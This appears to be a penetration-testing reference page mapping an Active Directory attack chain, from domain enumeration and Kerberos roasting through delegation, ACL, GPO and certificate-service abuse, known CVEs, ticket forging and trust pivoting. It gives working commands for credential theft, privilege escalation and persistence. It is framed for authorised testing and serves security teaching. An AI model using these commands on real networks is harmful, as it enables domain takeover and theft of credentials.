title: Active Directory attacks
intro: The AD attack chain mapped out for authorised testing: enumerate the domain, roast Kerberos, abuse delegation, ACLs and GPOs, exploit AD CS, chain the high-value CVEs, then take domain dominance and pivot across trusts. Each step links to the tool that does the work.

phases.name: Enumerate the domain
phases.blurb: Situational awareness first: who are the users, where is the DC, and which objects can you already touch? Everything downstream is read off this.

nodes.label: Unauthenticated: null / guest session & RID cycling
nodes.detail: Before any credential, try a null or guest bind. A SAMR/LSARPC null session that lists users, or RID cycling that recovers them, is itself a finding.

nodes.label: Validate usernames with Kerbrute (no lockout)
nodes.detail: Kerbrute asks the DC for a TGT for each name; AS-REP without pre-auth confirms a valid user and never touches the account's password, so it does not count against lockout. Feed it a name list (username-anarchy, statistically-likely-usernames).

nodes.label: Authenticated LDAP enumeration
nodes.detail: With any domain credential, read the directory: users, groups, computers, the password policy and the naming context. NetExec's LDAP module and ldapsearch cover the quick questions.
cmd: nxc ldap DC -u user -p pass -M get-desc-users

nodes.label: Map attack paths with BloodHound
nodes.detail: Collect the graph and let it find the path. Collect remotely from Linux with bloodhound-python or NetExec, or on-host with SharpHound, then import the zip and run the built-in queries (Shortest paths to Domain Admins, owned-to-DA).
cmd: nxc ldap DC -u user -p pass --bloodhound --collection-method All --dns-server 10.10.10.10

nodes.label: PowerView / on-host enumeration
nodes.detail: On a Windows foothold, PowerView answers the targeted questions BloodHound hints at: SPN accounts, unconstrained/constrained delegation, interesting ACLs, shares and GPOs.

phases.name: Roast Kerberos
phases.blurb: Two offline-crackable hashes you can often pull with nothing but a username list or one low-priv credential: AS-REP roast and Kerberoast.

nodes.label: AS-REP roasting (accounts without pre-auth)
nodes.detail: Any account with 'Do not require Kerberos pre-authentication' set hands out an AS-REP encrypted with its password hash to anyone who asks — no credential needed. Crack the $krb5asrep$ hash offline with Hashcat mode 18200.
cmd: nxc ldap DC -u user -p pass --asreproast asrep.txt

nodes.label: Kerberoasting (service accounts with an SPN)
nodes.detail: Any authenticated user can request a service ticket for any SPN; the TGS is encrypted with the service account's NT hash, so request it and crack offline (Hashcat mode 13100). Service accounts often have weak, non-expiring passwords.
cmd: nxc ldap DC -u user -p pass --kerberoasting kerb.txt

nodes.label: Targeted Kerberoasting (via write access)
nodes.detail: If you hold GenericWrite / GenericAll over a user, set a fake SPN on it, Kerberoast it, then clear the SPN. Turns a write ACL into a crackable hash for that account.

phases.name: Abuse delegation
phases.blurb: Kerberos delegation lets one account act for another. All three flavours are abusable; which one depends on what you found in enumeration.

nodes.label: Unconstrained delegation
nodes.detail: A host trusted for unconstrained delegation caches the full TGT of anyone who authenticates to it. Compromise such a host, coerce a Domain Controller to authenticate to it (printerbug / PetitPotam), capture the DC's TGT and use it to DCSync.
cmd: # coerce the DC to the compromised host:

nodes.label: Constrained delegation (S4U)
nodes.detail: An account with msDS-AllowedToDelegateTo set can, via S4U2self + S4U2proxy, request a service ticket for any user to the named SPN. Impersonate Administrator to that service. Note you can swap the service class (cifs/host/ldap), so one delegated SPN often reaches many services on the host.

nodes.label: Resource-based constrained delegation (RBCD)
nodes.detail: If you can write the target computer's object (GenericWrite / GenericAll / WriteDACL), set msDS-AllowedToActOnBehalfOfOtherIdentity to a computer account you control, then S4U to impersonate any user to that host. By default any user can add up to 10 machine accounts (MachineAccountQuota).

phases.name: Abuse ACLs & object control
phases.blurb: BloodHound's 'outbound object control' edges are direct privilege. Each right has a one-command abuse; chain them towards a high-value target.

nodes.label: Find abusable rights (BloodHound edges)
nodes.detail: Look for GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword and AddMember from a principal you control to a user, group or computer. PowerView resolves them on-host.

nodes.label: ForceChangePassword over a user
nodes.detail: Reset the victim's password without knowing the old one. Loud and disruptive (the real user loses access), so prefer shadow credentials or targeted Kerberoast when the right allows; note it in the report.

nodes.label: Shadow credentials (GenericWrite + AD CS)
nodes.detail: With write over a user or computer in an environment that has a CA, add a Key Credential (msDS-KeyCredentialLink) and authenticate via PKINIT — no password reset, quieter than ForceChangePassword, and it yields the NT hash too.
cmd: certipy shadow auto -u attacker@corp.local -p pass -account victim -dc-ip 10.10.10.10
pywhisker.py -d corp.local -u attacker -p pass --target victim --action add

nodes.label: AddMember / GenericWrite over a group
nodes.detail: Write access to a group means you can add yourself (or a controlled account) to it — the fast path when the group is Domain Admins or an equivalently privileged group.
cmd: net rpc group addmem 'Domain Admins' attacker -U 'corp.local/attacker%pass' -S DC01
net group 'Domain Admins' attacker /add /domain   # remove yourself afterwards

nodes.label: WriteOwner / WriteDacl
nodes.detail: Lower-level than GenericAll but just as powerful in two steps: take ownership, grant yourself full control, then abuse it. Clean up the ACL afterwards.

phases.name: Abuse Group Policy
phases.blurb: Write access to a GPO is write access to every computer and user it is linked to: schedule a task, add a local admin, or grant a user right across the OU.

nodes.label: Find writable GPOs
nodes.detail: BloodHound's GPO control edges, or PowerView, show which GPOs you can edit and what OUs they apply to. A writable GPO linked to a DC's OU is game over.

nodes.label: SharpGPOAbuse / pyGPOAbuse
nodes.detail: Inject an immediate scheduled task, add a local admin, or add a user right (e.g. SeDebugPrivilege) via the GPO. The change applies on the next policy refresh of every machine in scope — keep it tightly targeted and clean up.
cmd: SharpGPOAbuse.exe --AddComputerTask --TaskName 'upd' --Author corp\admin --Command 'cmd.exe' --Arguments '/c net localgroup administrators attacker /add' --GPOName 'Vulnerable GPO'

phases.name: Exploit AD CS
phases.blurb: A misconfigured Certificate Services is a domain-wide backdoor. certipy finds the vulnerable templates; the ESC that applies decides the exploit.

nodes.label: Find vulnerable templates (certipy / Certify)
nodes.detail: Enumerate the CA and templates and let the tool flag the ESCs. Start every AD CS assessment here.

nodes.label: ESC1: template lets the enrollee supply the subject
nodes.detail: A template with 'Supply subject in request' + client-authentication EKU that you can enrol in lets you request a cert for any user (SAN = Administrator), then authenticate as them.
cmd: certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 10.10.10.10

nodes.label: ESC8: NTLM relay to the CA web enrolment
nodes.detail: If HTTP web enrolment is on, relay a coerced machine (PetitPotam / printerbug) to /certsrv and request a cert as that machine — relay a DC and you get a DC cert, then DCSync.

nodes.label: ESC2 / 3 / 4 / 6 / 7 (see the cheat sheet)
nodes.detail: Any-purpose or SubCA templates (ESC2/3), a template ACL you can rewrite (ESC4), the EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag (ESC6), and dangerous CA management rights (ESC7). The ESC cheat-sheet table below maps each to its condition and exploit.
cmd: certipy template -u user@corp.local -p pass -template VulnTemplate -save-old   # ESC4 rewrite
certipy req ... -template User -upn administrator@corp.local   # ESC6, SAN honoured by CA

nodes.label: Authenticate with the certificate (PKINIT)
nodes.detail: Turn the issued .pfx into a TGT and the account's NT hash via PKINIT. certipy auth does both; Rubeus asktgt /certificate is the Windows equivalent.
cmd: certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10   # prints TGT + NT hash

phases.name: Chain the high-value CVEs
phases.blurb: A handful of patched-but-common vulnerabilities take you from a low-priv credential (or none) to Domain Admin in one shot. Confirm the patch state, mind the blast radius.

nodes.label: Zerologon (CVE-2020-1472)
nodes.detail: A Netlogon flaw lets an unauthenticated attacker reset the DC's machine-account password to empty, then DCSync. It breaks the DC's secure channel — you MUST restore the original hash afterwards or you leave the domain broken. Test first, exploit only in scope with the restore ready.

nodes.label: noPac / sAMAccountName spoofing (CVE-2021-42278 + 42287)
nodes.detail: Any user who can create a machine account (default MachineAccountQuota) can rename it to a DC's name, request a TGT, then a service ticket back as the DC — impersonating Domain Admin. One command with a built-in shell.

nodes.label: PrintNightmare (CVE-2021-34527 / 1675)
nodes.detail: The Print Spooler loads an attacker-supplied driver DLL as SYSTEM. Remote RCE on a DC with spooler enabled, or a local privesc. Check the spooler is reachable first.

nodes.label: PetitPotam coercion (CVE-2021-36942) → ADCS relay
nodes.detail: MS-EFSRPC lets you coerce a DC to authenticate to a host you choose, even unauthenticated on unpatched hosts. Relay that to AD CS web enrolment (ESC8) for a DC certificate, then DCSync. The classic unauthenticated-to-DA chain.
cmd: PetitPotam.py -u '' -p '' ATTACKER-IP DC01   # unauth where it still works

phases.name: Take domain dominance
phases.blurb: DS-Replication rights mean you can pull every hash; the krbtgt hash means you can forge any ticket. From here it is persistence and clean reporting.

nodes.label: DCSync (pull every domain hash)
nodes.detail: With DS-Replication-Get-Changes rights (Domain Admins, or granted by an abused ACL), impersonate a DC and replicate the hashes — including krbtgt and machine accounts. High-impact and logged (4662 / DRSUAPI); run in scope and dump to your own box.

nodes.label: Golden ticket (forge any TGT from krbtgt)
nodes.detail: The krbtgt NT/AES key signs every TGT, so with it you forge a TGT for any user and any group membership — valid until krbtgt is rotated twice. The ultimate persistence; use a real user and sensible lifetimes to stay quiet.

nodes.label: Silver ticket (forge a TGS for one service)
nodes.detail: With a service account's hash (e.g. a machine account for cifs/host), forge a TGS straight to that service — no DC contact, so quieter than a golden ticket but scoped to one SPN.
cmd: impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/target.corp.local Administrator

nodes.label: Persistence: DSRM, AdminSDHolder, diamond ticket
nodes.detail: Beyond golden tickets: sync the DSRM local admin to act as a DC, backdoor AdminSDHolder so a controlled user keeps rights on protected groups, or forge a diamond ticket (modify a real TGT) to evade golden-ticket detections. Document every persistence artefact for cleanup.

phases.name: Cross the trusts
phases.blurb: Domain Admin on one domain is often a stepping stone. Enumerate trusts, then escalate child-to-parent within the forest or pivot across a forest trust.

nodes.label: Enumerate trusts
nodes.detail: Map the trust directions and types first — intra-forest (parent/child) trusts share the same forest root and are the easy escalation; cross-forest trusts need foreign access.
cmd: Get-DomainTrustMapping   # PowerView, maps the whole forest

nodes.label: Child → parent (intra-forest SID history)
nodes.detail: A child-domain DA can forge a golden ticket with an ExtraSID of the forest root's Enterprise Admins group (RID 519). SID filtering is not enforced inside a forest, so this escalates to the whole forest.
cmd: impacket-ticketer -nthash CHILD_KRBTGT -domain-sid CHILD_SID -domain child.corp.local -extra-sid ROOT_SID-519 Administrator
impacket-raiseChild 'child.corp.local/da:pass'   # does it all in one

nodes.label: Cross-forest: trust keys & foreign members
nodes.detail: Across a forest trust, SID filtering blocks the ExtraSID trick, so hunt foreign group memberships and foreign ACLs, or use the shared inter-realm trust key to forge an inter-realm TGT. Kerberoast across the trust where it is allowed.
cmd: lsadump::trust /patch   # dump the inter-realm trust key (mimikatz)
